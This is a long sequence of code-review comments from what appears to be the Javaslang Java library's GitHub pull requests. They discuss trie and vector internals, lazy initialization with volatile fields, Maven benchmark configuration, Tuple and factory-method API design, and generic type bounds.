could be applied to many equals methods of Javaslang. Fewer lines will increase code coverage automatically. Think we should do that in a separate PR for the whole repo.\n. You are right - will change that.\n. Yes. In LinkedHashMultimap it completely disappeared. Other Multimap impls will follow...\n. Yes, used internally by the common builder impl. I will add an comment...\n. will clean that up soon!\n. I didn't do it on purpose. There are parameters that are passed internally by the Multimap impls and there are user-parameters that are routed through. We only test the latter because we are sure that the former are correct.\n. ok\n. @tbroyer thanks! @ruslansennov we should do that\n. Nice!\n. Yes, added a comment\n. will do\n. I'm not very used to rebasing. Did try it but the Atom editor had a problem and the interactive mode didn't work. Found a fix but using now a guy. There I squash/merge/cherry-pick and delete all commits manually.\nFrom what I can see now, this will not disappear because I did it in a commit on this branch.\n. Yes, what you see is a working darft. I will fore push later\n. This one is for developers. It may help understanding the code. But it could also a single-line comment...\n. Yes, you are right. then let's add some newlines ;-p\n. Thanks, will try that - still searching the right tool. Currently I use GitUp for Mac - nice and simple.\n. I think it will not be quadratic because valid containers do store their size. It will be linear over keys.\nHowever, storing the size might be a viable solution. We should do that in a separate PR when this re-design is finished. We currently have too many changes in one PR.\n. Haha, we could generate veeery looong package private classes which do nothing. Then we will eventually reach 99.99% code coverage without covering code ;)\nIs it already 1st April? :)\n. I'm not sure if the provided scope would work in all cases. For example I've found this on StackOverflow:\n\nIf you're planning to generate a single JAR file with all of its dependencies (the typical xxxx-all.jar), then provided scope matters, because the classes inside this scope won't be package in the resulting JAR.\n\nOn the other hand nothing is compiled when building a fat jar. I expect no error here.\nBut: What happens if an application inspects the annotations of a class/method by reflection and GwtIncompatible is not on the classpath? ClassNotFoundException?\nI would use the provided scope only for dependencies which are known to be present at runtime.\n. And then build a counter-example which uses reflection that fails to load the GwtIncompatible class?\n. @tbroyer Great, thanks for the explanation :)\n. This is a valid point. Several types already have the static factory methods with similar names:\n- [x] controls (Either, Option, Try, Validation)\n- [x] Future has successful() and failed() (Promise has the same method names...)\n- [ ] Collections\n- [ ] Tuples\n- [ ] Functions\nWe still have additional problems here - some API is ambiguous, e.g.\n``` java\n// returns a success\npublic static  $FutureType future(T result) { ... }\n// returns a failure\npublic static  $FutureType future(Throwable exception) { ... }\n```\nIt was a design decision to use consequently use of throughout our whole codebase, e.g.\n- Tuple.of(1, true, \"nice\")\n- List.of(1, 2, 3)\n- Try.of(() -> computation())\nMain reasons:\n- Java also uses the of API. It looks familiar to the user.\n- Lower case 'constructors' look alien to Java developers.\n- Scala has companion objects which give use upper case constructors without the use of new - that is what we really want. But the upper-case names are already taken by the Pattern Match API in order to deconstruct objects.\n- Minor: Static imports are always a few keystrokes more for the developer, even with an IDE.\nBut: The of notation is not concise enough.\nLike @paplorinc said, we do not need to duplicate the existing API. What we really want are shortcuts for the of factory methods only.\nI would like to have first char upper-case static factory method names within javaslang.API, e.g.\n- Tuple(1, 2), Tuple(1, 2, 3, 4)\n- Function1(obj::methodRef), CheckedFunction1(obj::methodRef)\n- Try(() -> computation()), Option(value), Future(() -> computation())\n- List(1, 2, 3)\n- HashMap(1, \"a\", 2, \"b\", 3, \"c\")\nThis would go adhere with API.Match() and API.Case() etc.\nTo this day static factory methods for (most) collection interfaces were out of scope, e.g.\n- Seq(1, 2, 3)\n- Set(1, 2, 3)\n- Map(1, \"a\", 2, \"b\", 3, \"c\")\nBut maybe it would be nice to have these too.\n\nQ: So, what to do with the names of generated patterns? They will clash with the new API.\nA: We will break backward compatibility and change the annotation processor of javaslang-match. We will generate a preceding $ for patterns. This goes adhere with the use of $ for standard patterns like\n- $() - any\n- $(value) - equality\n- $(predicate) - condition\nExample:\njava\nT result = Match(value).of(\n    Case($Tuple($(1), $(true), $(\"nice\")), (v1, v2, v3) -> ...),\n    Case($List($(1), $()), (head, tail) -> ...)\n);\nWe determine these specialities:\n- $Tuple($(Tuple(1, 2, 3)) will contain a $Tuple pattern and a Tuple constructor. Hard to read?\n- $List($(), $()) deconstructs head element and tail list\n- List(v1, v2) constructs a List containing two values v1, v2\n\nThe bottom line is that this will be a breaking change that will be targeted for 3.0.0\nHowever, the first char upper case constructors can be already introduced but they will raise problems when used in conjunction with the Match API (, e.g. import static javaslang.API.*;).\n. Were these accidentally committed?\n. Oh - I've overseen that the new formatter also adds here more whitespace. Could you please revert the formatter option in an additional PR. We want generally not add additional horizontal whitespace (like we had also before for method chaining).\nIt is minor for this PR. I will pull it in as-is (formatted). Once we have the new formatter I will format the whole code-base in a separate PR.\nSorry for being off-topic again :)\n. This commit looks fine (beside formatting as stated above) - will move to the review of the next commit now...\n. would a assert minLength >= 0 (or something similar) make sense?\n. What if array == EMPTY? Would it make sense to just return EMPTY then instead of calling close() (can minLength == 0?) or arrayCopy()?\n. Style-alert :) else branch missing (two related disjunct cases) and final keyword at Object[] array\n. dito (else-branch)\n. Is always clear that Iterable isn't null? We could also do the check here and not in Vector (but don't necessarily have to...)\n. Because branchingFactor() is referential transparent and has no arguments it is effectively constant. I know that the call will be optimized away at runtime but I would write it as constant:\njava\nstatic int BRANCHING_FACTOR = 1 << BRANCHING_BASE;\nIt isn't final because of your branching base tests, right?\nWe should make these fields/methods private static final and use a hack for the tests instead.\njava\nprivate static final int BRANCHING_FACTOR = 1 << BRANCHING_BASE;\nThe tests could overwrite both fields, the BRANCHING_FACTOR does not need to be a method!\nWe should not weaken code because of unit tests!\n. Traversable.grouped() behaves like this:\njava\n[1,2,3,4,5].grouped(2) = [[1,2],[3,4],[5]]\nHere we would have [[1,2],[3,4],[5,?]] instead, right? What is the content of the last element of the last subtree? null?\n. Why do we not use\njava\nfinal Object[] array = new Object[length];\n?\n. We could change it to use Iterable:\njava\nstatic Object[] asArray(java.util.Iterable<?> it, int length)\nThat saves us iterator() calls within our code-base, right? I can't find here more uses of this method but maybe there exist already other uses where we only have an Iterator at hand instead of an Iterable - just a question.\n. Do we really need that extra method? Why use the ofAll(Iterable) method and check instanceof Collection in order to call size()? Would it really be significant slower? Other collections do not have that ofAll method.\n. Why do we need this public method? The user should not be bothered providing a size, right? If it is needed internally I would reduce the visibility.\n. What if size < 0?\n. Yep, I've confused min with max - you are right :)\n. Ok, your call.\nMutable static fields + concurrency = \ud83d\udca3 Are we sure our benchmarks / tests are correct?\n(Also this is a security risk...)\n. Ok. But removing whitespace again (aligning newlines do () would be cool.\n. The else branch covers depthShift > 0 && (depthShift < BRANCHING_BASE || depthShift > BRANCHING_BASE), right?\nJust asking to get sure that depthShift can be less than BRANCHING_BASE...\n. Ok. Are you sure the settings are the most recent or might they be old, according to that version of the branch / rebased changes?\n. Yes, looks good to me. Asking myself why my local settings are different... Will re-import the settings then also.\n. My main pain point in previous discussions was here that we leak BMT internals into the Vector impl.\nHow about leaving the BMT.iterator() method as is and implementing Vector.iterator() like that:\njava\n@Override\npublic Iterator<T> iterator() {\n    return (Iterator<T>) Iterator.concat(\n            Iterator.of(leading),\n            trie.iterator(),\n            Iterator.of(trailing)\n    );\n}\n(Did not test it)\n. > Thanks, but I did test it and it was surprisingly slow.\nReally?\nThere might be a little overhead for creating 4 Iterators instead of 1 but this is what I expect:\nFor Iterating a small amount of elements the constant factor of creating 4 Iterators will be weighted much.\nI.e. when Iteration takes 8 ms for one Iterator and 16 ms using 4 Iterators the relative diff looks huge, but really it isn't!\nI.e. when Iteration takes 10008 ms for one Iterator and 100016 ms using 4 Iterators the relative diff is near zero (+/- measure error).\n\nBecause the BMT.iterator() is nearly perfect and also the Object[] iterators are very efficient loops, the diff can't be huge. Our test cases are not right (interpreted).\n. Will go to sleep now and go on tomorrow - first 'working' day after 4 weeks vacation :) I'm mostly offline during the day. My mobile phone is broken (I wait until the release of iPhone 7), also I have no Internet (for private use) at $work.\nGreat work so far!!!\n. I know this sounds weird but it is the only explanation. Creating the Iterators is constant effort. Their implementation is as efficient as the solution with one Iterator. Beside Iterator creation there could be only one more reason - the concat Iterator is implemented inefficient. But it is only a simple iteration and switch of existing Iterators. That can't be the bottleneck because also the switch is constant: exactly 3 times, regardless of the size of the Vector.\nWe should investigate it. It is a good opportunity to get my hands dirty regarding the benchmarks.\n. I've thought about it. The time-penalty of the simple, combined Iterator may come from the delegated Iterator calls:\n- first the combined Iterator is called\n- then the combined Iterator delegates to the current underlying Iterator\nWhen I get some time (hopefully tomorrow) I will benchmark it, comparing a simple Iterator and a combined Iterator that delegates to a simple Iterator.\n. Hah! I'm a Maven expert - I think it has to be the class, not the method, i.e.\nxml\n<mainClass>javaslang.JmhRunner</mainClass>\ninstead of\nxml\n<mainClass>javaslang.JmhRunner.main</mainClass>\nCould you please test if it is right?\n. I agree, that's not safe.\nIn an early stage of Javaslang I experimented with the integration of Tuple into the Value hierarchy. There were several problems, for details see #692 (e.g. this). In the end I understood: 'A Tuple is a Tuple'. Not more, not less. It isn't a Seq, nor a Value.\nWe should not change the return type - too much confusion / not straight forward enough. Nor we should throw - that's unsafe.\nI think these are our options:\n- remove append(), prepend() from the base interface Tuple and remove them from Tuple8\n- remove these methods completely\nI don't know if these methods are used often in practice, haven't seen a use-case yet. So we should consider to remove them completely. Keep things simple! Less is more.\n. It looks like append() and prepend() are Tuple builders. In your example the elements are already known. Changing the example to the following would more concise but also inefficient regarding creation of Tuple instances:\njava\nTuple result = Tuple.empty();\nfor (int i = 0; i < list.size(); i++) {\n    result = result.append(list.get(i));\n}\nBecause append() and prepend() make most sense in a dynamic context (i.e. size of the List is unknown), the result type is just Tuple. In my opinion this kind of code is a corner case. It is comparable / has the same characteristics like reflection, which is a code smell and not type safe.\nI'm not convinced that these methods are really useful, they do not encourage a good programming practice.\n. Yes, I will experiment with it and come back to you!\n. A list.toTuple() is not possible because the number of elements may exceed the max Tuple arity.\ntuple.toSeq() exists already.\nWhat we really need is a heterogenous list (HList). We have already an issue for that but the generics are not human-readable any more when the list grows. For now I would not implement an HList. It would start to make sense when we have local variable type inference in Java.\n@ashrko619 Sorry for being torn back and forth. I think we need a more in-depth analysis for future features, including code examples, pros, cons etc.\nPlease give me some time to think about this feature...\n. I would use HashMap.of(<pairs>) instead of creating Tuples. But if you don't feel comfortable with it we leave it as-is!\n. @talios Great! I fiddled around now a bit. This is my current profile in the parent pom:\nxml\n<!-- A profile for running the benchmarks -->\n<profile>\n    <id>benchmark</id>\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.codehaus.mojo</groupId>\n                <artifactId>exec-maven-plugin</artifactId>\n                <version>${maven.exec.version}</version>\n                <executions>\n                    <execution>\n                        <phase>test</phase>\n                        <goals>\n                            <goal>java</goal>\n                        </goals>\n                        <configuration>\n                            <classpathScope>test</classpathScope>\n                            <mainClass>javaslang.JmhRunner</mainClass>\n                        </configuration>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n</profile>\nIf it is started with mvn test -P benchmark -X we get this output (partial):\nbash\n[DEBUG] Invoking : javaslang.JmhRunner.main()\n[DEBUG] Plugin Dependencies will be excluded.\n[DEBUG] Project Dependencies will be included.\n[DEBUG] Collected project artifacts []\n[DEBUG] Collected project classpath [/Users/daniel/git/temp/javaslang-benchmarkprofile/target/test-classes, /Users/daniel/git/temp/javaslang-benchmarkprofile/target/classes]\n[DEBUG] Adding to classpath : file:/Users/daniel/git/temp/javaslang-benchmarkprofile/target/test-classes\n[DEBUG] Adding to classpath : file:/Users/daniel/git/temp/javaslang-benchmarkprofile/target/classes\n[DEBUG] joining on thread Thread[javaslang.JmhRunner.main(),5,javaslang.JmhRunner]\n[WARNING] \njava.lang.ClassNotFoundException: javaslang.JmhRunner\n    at java.net.URLClassLoader.findClass(URLClassLoader.java:381)\n    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)\n    at java.lang.ClassLoader.loadClass(ClassLoader.java:357)\n    at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:281)\n    at java.lang.Thread.run(Thread.java:745)\nWe see that the classpath isn't right.\nIf we run mvn test -pl javaslang-benchmark -P benchmark it works.\n\nOur goal is to run it with mvn test -P benchmark.\nMaybe the surefire plugin in the parent has to be configured to exclude javaslang-benchmark by default. The 'benchmark'  profile (in the parent pom) then configures surefire to include it. The javaslang-benchmark/pom.xml then includes the exec:java plugin config???\n. It think it may be the case because of the generic bounds of values...\nType-investigation seems to got worse in Java 9. These are the WTF!? moments during development - we know that the type is right but the compiler does complain.\nStarting from JDK 1.8.0_40 the compiler got steadily better. It is sad to see that Java 9 is a step back :(\n\nHowever, I'm not sure if I want to use a lambda here. Instead JDK 9 should be fixed :) That's also the case for other changes. Is it possible to defer some changes an let the build break? Maybe we should report these finding and hope that they get fixed until the release of JDK 9 (which may be delayed again??).\nIf we let the JDK9 build break it should not affect the JDK8 build of our PRs, merges and so on...\n. This falls into the category of the above comment.\nWhat if we remove ? super in the cast?\njava\nreturn toSortedMap((Comparator<K> & Serializable) K::compareTo, f);\n. It could stay static. Is there a reason to make it an instance method? Then implicit this is also passed...\n. These interface fields are implicitly static final, i.e. constants. By (standard Java) naming convention the names have to be upper-case:\njava\nNodeModifier COPY_NODE = (o, i) -> copy(o, i + 1);\nNodeModifier IDENTITY = (o, i) -> (Object[]) o;\n. collapseHeight() is always called directly after constructing the BMT - which is a smell :)\nWe can save one BMT instance (in the worst case) by changing collapseHeight() to be a static factory method:\njava\n/* drop root node while it has a single element */\nprivate static BitMappedTrie<T> collapseHeight(Object[] array, int offset, int length, int shift) {\n    for (; shift > 0; shift -= BRANCHING_BASE) {\n        final int skippedElements = array.length - 1;\n        if (skippedElements != digit(offset, shift)) {\n            break;\n        }\n        array = getAt(array, skippedElements);\n        offset -= treeSize(skippedElements, shift);\n    }\n    return new BitMappedTrie<>(array, offset, length, shift);\n}\nThen we replace\njava\nreturn new BitMappedTrie<T>(root, index, length() - n, depthShift).collapseHeight();\nby\njava\nreturn collapseHeight(root, index, length() - n, depthShift);\nMaybe we should rename collapseHeight(...) then to of(...)? But not necessarily.\n. this is evil - modifying the VectorIterator from the outside!?\n. MutableWrapper is unnecessary overhead. Instead we should remove the final keyword and delete MutableWrapper.\nUpdate: I see, you need it to be effectively final in order to be used from within a lambda... :-/\n. Lorinc, could you please explain to me the internal meaning of compactHeight(). I understand that unnecessary parts of the BMT are released. But which modification of the BMT made it necessary? Does it make sense for the initial/minimal BMT also or do we need it because we introduced some sort of change to the BMT?\nThanks for 'sharpening me up' (in german: 'Aufsch\u00e4rfen') ;-)\n. > When we do have an error though (please see the Travis log or pull it locally) or a simplification (e.g. the Character constructor), we should definitely take advantage of Java 9's wisdom.\ntrue\n. After 2.0.4 and 2.1.0 (maybe 2.2.0) are through the door I will focus on Java 9. These hints are very helpful!\n. Can we widen the defaultValue type to Traversable<? extends V> without breaking anything?\n. Two minor points:\n- Let's name it equals, it is an optimized form of equals(Object) that first tests the hash.\n- Let's also call the first param keyHash or rename the instance variable to hashCode to have consistent naming.\n. looks good, also we save the (un)boxing of ints here\n. \ud83d\udc4d \n. Minor: I would it name it EMPTY to be consistent with all other Javaslang types that have an EMPTY instance\n. ~~Methods should be no on-liners (for readability)~~ It is ok\n. I tested it with Stream (short version):\n``` java\ninterface Stream {\nstatic Stream<Integer> ofAll(int... array) {\n    return Stream.ofAll(Iterator.ofAll(array));\n}\n\nstatic Stream<Long> ofAll(long... array) {\n    return Stream.ofAll(Iterator.ofAll(array));\n}\n\n}\n```\nThe test:\n``` java\npublic class Test {{\n// ok\nStream<Integer> ints = Stream.ofAll();\n\n// IntelliJ IDEA complains: Required: Stream<Long>, Found: Stream<Integer>\nStream<Long> longs = Stream.ofAll();\n\n// does also not work\nStream<Long> longs = Stream.<Long> ofAll();\n\n}}\n```\nHowever, unexpected behavior with varargs can only occur when we have reference types, e.g.\n``` java\n// reference type T\npublic  void foo(T... params) { ... }\nint[] arr = {1, 2, 3};\nfoo(arr); // passes an int[][] array containing a single int[] element\n```\nSee also this StackOverflow question.\nI see no problem to switch to varargs for primitive types. There is no risk that the array is confused with a single object.\nWe should apply that change then to all other Javaslang types that have static factory methods ofAll(<primitive array>) - of course in another PR.\nThat's a nice API change, simplifying things! :-)\n(See also #1569)\n. Just a question :) Did you change your local formatter? Now we have many single-line methods. It does not really hurt but I think you may have a reason to reformat. Generally ok for me!\n. @ashrko619 @ruslansennov Let's return a SimpleEntry.\nJavaslang is immutable-by-design. The java.util package is a mutable-by-default parallel universe. The Map.Entry has a setValue() method. Returning an object that throws would be unsafe.\nThx for asking and giving an alternative. \ud83d\udc4f \n. I think we can widen the argument types:\njava\nstatic <T1, T2> Tuple2<T1, T2> fromEntry(Map.Entry<? extends T1, ? extends T2> entry) { ...\nOnly immutable types are covariant in generic arguments, here is the classical counter example (taken from StackOverflow):\njava\n// Illegal code - because otherwise life would be Bad\nList<Dog> dogs = new List<Dog>();\nList<Animal> animals = dogs; // Awooga awooga\nanimals.add(new Cat());\nDog dog = dogs.get(0); // This should be safe, right?\nProjected to our use-case, this can't happen:\njava\n// Illegal code - because otherwise life would be Bad\nMap.Entry<T, Dog> t_dog = new SimpleEntry<>(t, dog);\nTuple<T, Animal> t_animal = Tuple.fromEntry(entry);\nTuple<T, Animal> t_animal2 = t_animal.update2(new Cat());\nDog dog = t_dog.getValue(); // ok\nSide-note: We can improve the generics of other types, too. We will do it in another PR.\njava\npublic interface Validation<E, T> extends Value<T> {\n    // should be `Either<? extends E, ? extends T> either`\n    static <E, T> Validation<E, T> fromEither(Either<E, T> either) { ... }\n}\n. minor (space): tuple = instead of tuple=\n. The changes look good to me, thank you!\nWe are nearly there.\nBefore I merge, please align the lines right. The indentation needs to be fixed in the generator.\nSee also https://github.com/ashrko619/javaslang/blob/26257170f75eac814354e5f27bca6c48a7455a52/javaslang/src-gen/main/java/javaslang/Tuple2.java#L138-L156\n. The signature is OK and aligns to existing transform() methods that are already present.\n\nSide-note:\nI'm thinking we need this instead (all over the lib, in another PR):\njava\n<U> Future<U> transformResult(Function<? super Try<? super T>, ? extends Try<? extends U>> f)\nSee also Sebastian's example.\n. Please use a BiFunction instead of a Function2 (which is a BiFunction) and add upper/lower type bounds:\njava\n<U, R> Future<R> zipWith(Future<? extends U> that, BiFunction<? super T, ? super U, ? extends R> combinator)\n. Mmh, please add a unit test that let's the combinator fail, e.g. a combinator that throws a RuntimeException.\nI expect that the Future that is returned by zipWith does never return.\nNote to myself: We need also to check the other Future/FutureImpl methods. It must be ensured that in each case we get a defined result. We can do it by adding tests that use lambda arguments that just throw a RuntimeException. map delegated to mapTry, which should handle that case. The current optimization may change this behavior. #LetItCrash \n. ...but I think the Try.run(...).onFailure(promise::failure) part of transformResult already handles this case.\nNevertheless, having a test helps to ensure it.\n. I agree that we should remove the speed-up comment.\nHowever, it is hard to recognize design patterns/idioms when looking at code. Code is just a textual projection of abstract ideas (very much like 3D to 2D/Screen projection).\nI want a comment for developers why we added a local var instead of using the well-known classical double-check idiom.\n. Will create a (local) benchmark and post the results...\n. Reads of volatile variables need to access the main memory to ensure the value is actual. tmp could be named cachedSupplier or localSupplier.\nBecause we return value instead of supplier, we do not need to cache the supplier before entering the synchronized block.\nWithin the synchronized block we have two reads (1. not-null check, 2. get() call). So a changed supplier saves one main-memory read.\nThe optimized code then looks like this:\njava\npublic T get() {\n    if (this.supplier != null) {\n        synchronized (this) {\n            // only one volatile read from main-memory\n            final Supplier<? extends T> supplier = this.supplier;\n            if (supplier != null) {\n                value = supplier.get();\n                this.supplier = null; // free mem\n            }\n        }\n    }\n    return value;\n}\n. Extracting this method is possible but we do not need to introduce new public API.\nOn the 'level' of Value it is not intended to fall back to equals. The eq(Object) does only fall back for contained values.\n. Our abstract classes (other than AbstractIterator) are not public.\n. Overwriting eq would break the contract of structural equality. E.g. this following must be true:\n``` java\nTreeSet.of(1, 2).eq(Arrays.asList(1, 2)) == true\nTreeSet.of(1, 2).eq(Arrays.asList(2, 1)) == false\n``\n. Side-note: becauseotheris aSetexists()is equivalent toexsistsUnique()`, am I right?\n. Inheriting from a package-private (see comment above) subclass causes trouble. Java 8 has a bug regarding method-references and inherited public impls of invisible super-classes...\nA solution could be to create a helper class Sets (similar to Maps and Arrays) and add a methods\nclass Sets {\n    static boolean equals(Set<?> set1, Object o) {\n        if (set1 == o) {\n            return true;\n        } else if (o instanceof Set) {\n            final Set<?> set2 = (Set<?>) o;\n            ...\n        } else {\n            return false;\n        }\n    }\n}\n. Please don't reformat code. Do you use IntelliJ IDEA? Then please use our setting <javaslang-root>/.ide/idea-settings.jar\n. The implementation then looks like this:\njava\n@Override\npublic boolean equals(Object o) {\n    return Sets.equals(this, o);\n}\n. Please remove these three constants (but not the FunctionalInterface). The method references will be added above...\n. HashSet.class, HashSet::of,\nLinkedHashSet.class, LinkedHashSet::of,\nTreeSet.class, TreeSet::of\n. java\nprivate Seq<Tuple2<Class<?>, Class<?>>> pairwiseDistinctSetClasses() {\n    return generators.keySet().toList()\n            .combinations(2)\n            .map(seq -> Tuple.of(seq.get(0), seq.get(1)));\n}\n. we don't need the congruenceTest\n. not needed any more\n. Please add tests for the negative case (sets are not equal). Also the second set should be initialized with test strings of different order (because of LinkedHashSet).\n. Hi @mping, good to hear. Take your time!\n. Wonderful idea! I have two remarks:\n1) supplier.get() may return null\nOur value has two possible null-states: null as undefined and null as initialized state. If it is initialized with null, the get() calls will be slower than in #1576.\n2) two reads from main memory within the synchronized block\nBecause supplier is volatile, all occurrences will be read from main memory, in particular:\n- if (supplier != null) { ... }\n- value = supplier.get();\nThe following solution solves 1) and 2) by fusing the ideas of #1577  with those of #1576 and additionally adding an UNDEFINED object:\n``` java\n    private static final Object UNDEFINED = new Object();\nprivate transient volatile Supplier<? extends T> supplier;\n\n@SuppressWarnings(\"unchecked\")\nprivate T value = (T) UNDEFINED;\n\npublic T get() {\n    if (value == UNDEFINED && this.supplier != null) {\n        synchronized(this) {\n            final Supplier<? extends T> supplier = this.supplier;\n            if (supplier != null) {\n                value = supplier.get();\n                this.supplier = null;\n            }\n        }\n    }\n    return value;\n}\n\n```\nI ask myself if the isEvaluated method could now just use value like this:\njava\npublic boolean isEvaluated() {\n    // fast read, memory synchronized with volatile write of supplier\n    return value != UNDEFINED;\n}\ninstead of\njava\npublic boolean isEvaluated() {\n    // slow read from main memory\n    return supplier == null;\n}\n. This is...... awesome :)\nIt seems to solve the unsolvable problem of getting the class of a generic type. I've played around with it and couldn't construct an unsafe example (yet).\nPlease do this change to a separate PR, this little change is really worth it. I will pull it before this PR then.\n. Maybe this comment is crap but some lines of Lazy (including this) definitely need to be commented.\nI'm also no friend of blowing up concise code with bla, bla. But here is happening something important behind the curtain. We need to mention that non-volatile instance variables are synced to the main memory when volatile instance variables are updated. Our code strongly relies on this property.\n\nWhat does volatile do?\n(...) Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f.\n\n- JSR 133 FAQ\n. IMPORTAT UPDATE\nWhen I interprete this right\n\nanything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f.\n\nthen the check value == UNDEFINED may not reflect the actual main memory state.\nExample:\n1. Thread A calls get(), acquires the lock and writes value and supplier (but is still in the synchronized block)\n2. Thread B calls get() and checks value == UNDEFINED. Because Thread B did not read supplier, the initialized value gets not visible to Thread B. Then supplier != null is checked, which is falsebecause Thread A set it to null. Because supplier was read, the initialized value is now visible to Thread B and the return value makes sense.\nIf the above cannot be proved to be wrong then, for the sake of correctness and safety, we should remove the first value == UNDEFINED check completely again. What remains is this:\n``` java\n    private transient volatile Supplier<? extends T> supplier;\nprivate T value;\n\npublic T get() {\n    if (this.supplier != null) {\n        synchronized(this) {\n            final Supplier<? extends T> supplier = this.supplier;\n            if (supplier != null) {\n                value = supplier.get();\n                this.supplier = null;\n            }\n        }\n    }\n    return value;\n}\n\n```\nThis is exactly the solution proposed in #1576.\nAlso isEvaluated() stays as is.\n. I think we do not need MutableInt. Instead we could add a visit method that takes a param index and returns the updated index:\njava\n@FunctionalInterface\ninterface LeafVisitor<T> {\n    int visit(T leaf, int start, int end, int index);\n}\nThe visit method then looks like this:\n``` java\n    @SuppressWarnings(\"unchecked\")\n     int visit(LeafVisitor visitor) {\n        int start = lastDigit(offset);\n        int currentIndex = 0;\n        for (int index = 0; index < length; ) {\n            final T2[] leaf = (T2[]) getLeaf(index);\n            final int end = Math.min(leaf.length, start + length - index);\n        currentIndex = visitor.visit(leaf, start, end, currentIndex);\n\n        index += end - start;\n        start = 0;\n    }\n    return currentIndex;\n}\n\n```\nBEFORE:\n``` java\n        ...\n        final MutableInt index = new MutableInt();\n        this. visit((leaf, start, end) -> {\n            int resultIndex = index.val;\n            for (int i = start; i < end; i++) {\n                final T value = leaf[i];\n                if (predicate.test(value)) {\n                    results[resultIndex++] = value;\n                }\n            }\n            index.val = resultIndex;\n        });\n    return (length() == index.val) ? ...\n\n```\nAFTER:\n``` java\n        ...\n        final int resultLength = this. visit((leaf, start, end, index) -> {\n            for (int i = start; i < end; i++) {\n                final T value = leaf[i];\n                if (predicate.test(value)) {\n                    results[index++] = value;\n                }\n            }\n            return index;\n        });\n    return (length() == resultLength) ? ...\n\n```\nNote: Similar changes could be applied to all other methods that use visit.\n. Please explain to me how nulls can occur. I have questions:\n- Does array contain these nulls?\n- What is the meaning of these nulls?\n- Is more and more memory consumed over time be nulled array slots?\nThe BMT should only contain valid nodes.\nBefore changing the implementation please explain to me how the tree structure changes over time.\n. Yep, EMPTY is better.\n. I also think we do not need the further improvement (for now).\nWith the new visitor, the map method looks like this:\njava\n    <U> BitMappedTrie<U> map(Function<? super T, ? extends U> mapper) {\n        Objects.requireNonNull(mapper, \"mapper is null\");\n        final Object[] results = new Object[length()];\n        this.<T> visit((leaf, start, end, index) -> {\n            for (int i = start; i < end; i++) {\n                elems[index++] = mapper.apply(leaf[i]);\n            }\n            return index;\n        });\n        return BitMappedTrie.ofAll(elems, length);\n    }\n. Hi @jbgi, inlining by keeping it small is a great idea!!\nI also think that the read of value is dirty.\nThe local var T v most probably isn't needed because value isn't volatile and reads are cheap.\nI will further play around with different solutions....\n. Using a synchronized method is equivalent but more concise.\njava\nprivate synchronized T computeValue() {\n    final Supplier<? extends T> s = supplier;\n    if (s != null) {\n        value = s.get();\n        supplier = null;\n    }\n    return value;\n}\nWill measure the variants later today.\n. @jbgi Thanks - that is the missing counter-example I wasn't able to find. Then we have to revert this merge. /cc @paplorinc \n. > I think we should only revert, if we can find a better solution...\nDefinitely not. We will not introduce unsafe/breaking code. A better solution would be to deprectate (and remove in future) the whole method if it makes no sense.\n. @jbgi could you please provide a little example (use-site perspective)?\n. @jbgi found it :)\n``` java\n    @Test\n    public void array_is_safe() {\n        List list = List.range(1, 2);\n    assertThat(list.toArray().array(Integer[].class), instanceOf(Integer[].class));\n}\n\n```\n. When we use synchronized, this is always OK because the synch block ensures that supplier.get() (which sets the atomic boolean) is only entered by one thread at a time:\njava\nassertThat(isEvaluated.getAndSet(true)).isFalse();\nThe second assert also can't fail because value has always the correct value. The worst case that can happen is, that supplier.get() is called twice (because the second thread did not see the initialized var).\nThe latter case (twice initialized) is what you see for non-volatile vars without the synchronized block. Because the synchronized block is missing, the first assertion fails (supplier.get() entered by two threads and atomic boolean assertion fails).\nRight?\n. @paplorinc we can do better ;) instead of\njava\nCompletableFuture.allOf(\n            values.flatMap(t -> range(0, 10)\n                    .map(j -> runAsync(() -> assertThat(t._1.get()).isEqualTo(t._2)))\n            ).toJavaArray(CompletableFuture.class)\n    ).join();\nwe could use\njava\nFuture.sequence(\n    values.flatMap(t -> range(0, 10)\n                    .map(j -> runAsync(() -> assertThat(t._1.get()).isEqualTo(t._2)))\n)/*.await()*/;\n. or\njava\nFuture<Void> tasks = values.flatMap(t -> range(0, 10)\n                    .map(j -> runAsync(() -> assertThat(t._1.get()).isEqualTo(t._2)));\nboolean isOk = Future.fold(tasks, true, (result, task) -> result & task.isSuccess());\nassertThat(isOk).isTrue();\n(warning: untested code)\n. @jbgi It does also not help for generic classes :-/\n``` java\nfinal Value> value = of(Option.of(1), Option.of(2), Option.of(3));\n// Compile error: Cannot select from parameterized type\nfinal Option[] ints = value.toJavaArray(Option[].class);\n```\n@paplorinc It seems that Class<? super T> is the only solution (but unsafe).\nI'm tempted to take it. What do you think? +1 or -1 :)\n. As @paplorinc said, these are our options:\n``` java\n// unsafe\nT[] toJavaArray(Class<? super T> componentType) // one size fits all\nvs\n// safe\nT[] toJavaArray(Class componentType) // variant for non-generic types\nT[] toJavaArray(T[] array)\n```\nI think the first, unsafe variant is no viable solution.\nExample:\n``` java\n// before\nValue v = Option.of(\"\");\nCharSequence[] s = v.toJavaArray(CharSequence.class);\n// after\nValue v = Option.of(\"\");\nString[] s = v.toJavaArray(CharSequence.class); // will eventually throw at runtime\n```\nThe method toJavaArray(Class<T>) is still useful for non-generic types,\nwe do not need to deprecate it.\n. @shipilev Thanks for the great explanation!\nOne question. We saw that write(value, SOME_VALUE) is synchronized with write(supplier, null) because supplier is volatile. What does another Thread see that only performs read(value). Does an execution exist such that read(value) = null (uninitialized) and supplier == null?\n. @shipilev many thanks for the great explanation!! :)\n@paplorinc @jbgi then we should use a straight forward solution and add two optimizations\n1) enable inlining by keeping the get() method small\n2) add a local var that holds the volatile instance var within the synchronized block to reduce the volatile reads from 2 to only 1.\nSolution:\n``` java\nprivate volatile Supplier<? extends T> supplier;\nprivate T value;\n@Override\npublic T get() {\n    return (supplier == null) ? value : computeValue();\n}\nprivate synchronized T computeValue() {\n    final Supplier<? extends T> lazyValue = supplier;\n    if (lazyValue != null) {\n        value = lazyValue.get();\n        supplier = null;\n    }\n    return value;\n}\n```\n@paplorinc Could you please change the PR accordingly if the benchmarks still look good?\nThanks all! This will be an awesome Lazy implementation 